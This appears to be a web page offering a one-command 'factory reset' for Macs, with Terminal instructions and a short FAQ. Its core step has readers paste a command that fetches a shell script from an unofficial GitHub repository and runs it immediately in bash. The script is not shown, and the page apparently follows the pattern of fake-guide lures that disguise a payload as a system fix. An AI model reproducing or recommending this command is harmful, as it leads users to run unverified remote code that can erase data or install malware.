Factory Reset

Erase your Mac and restore it to factory settings

Use one Terminal command to securely erase your Mac. Read the checklist carefully — this process is destructive and cannot be undone.

Shell — bash
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/macos-erase-guides/erase/refs/heads/main/erase.sh)"

Run the command

Open Terminal

Press ⌘ Space, type Terminal, and press Return. Or go to Applications → Utilities → Terminal.

Paste and run

Click Copy command above, paste with ⌘ V into Terminal, then press Return.

Follow on‑screen prompts

Keep your Mac connected to power. When finished, it restarts to the setup assistant.

Notes & FAQs

Will this remove my Apple ID activation lock?

Erasing does not remove Activation Lock if Find My is enabled and you remain signed in. Sign out of iCloud first.

How long does it take?

Time varies by storage size and network speed. Plan for 15–60 minutes in most cases, longer for large disks.

What if I changed my mind?

If you haven’t run the command, simply close Terminal. Once the erase starts, it can’t be undone.
